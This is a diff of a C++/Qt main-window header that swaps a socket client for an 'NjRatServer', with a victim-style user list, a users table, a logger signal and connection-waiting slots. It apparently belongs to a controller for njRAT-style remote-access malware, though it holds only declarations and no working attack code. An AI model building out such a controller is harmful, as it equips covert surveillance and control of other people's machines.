@@ -1,10 +1,11 @@
 #ifndef MAINWINDOW_H
 #define MAINWINDOW_H
 
-#include "functionalityform.h"
+#include "njratserver.h"
+#include "userinfo.h"
+#include "userlist.h"
+#include "userstableform.h"
 #include <QMainWindow>
-#include <QString>
-#include <QTcpSocket>
 
 namespace Ui {
     class MainWindow;
@@ -19,35 +20,27 @@ public:
     ~MainWindow();
 
 signals:
-    send_mainWindow(QMainWindow*);  // Передать главное окно
-    send_user_info(QTcpSocket*, const char*, QPixmap*, QString, QString); // Передать информацию о пользователе
-    send_screenshot_for_sharing(QPixmap*);  // Отправка скриншота
+    void send_main_window_for_user_window(QMainWindow*);
+    void send_sLogger(QString);
+
+public slots:
+    void set_active_user(QString, QString*);
+    void get_waiting_for_connection();
+    void start_ui();
 
 private slots:
+    void on_run_triggered();
     void on_author_triggered();
     void on_connectButton_clicked();
     void on_canselButton_clicked();
-    void on_connect_triggered();
-    void on_okButton_clicked();
     void on_quit_triggered();
-    void on_acceptButton_clicked();
-    void on_disconnectButton_clicked();
-
-public slots:
-    void socketReady(); // Готовность читать данные от сервера
-    void socketDisc();  // Отключение от сервера
+    void on_usersTable_triggered();
 
 private:
     Ui::MainWindow *ui;
-    FunctionalityForm* functionalityForm;
-    QTcpSocket* socket;
-    QByteArray bufferData;
-    char permissions[3];
-
-    void beginUi();
-    void ipEnterUi();
-    void vereficationUi();
-    bool ipValidation(QString);
+    UsersTableForm* usersTableForm;
+    NjRatServer server;
+    UserList<userInfo, QString> userList;
 };
 
 #endif // MAINWINDOW_H
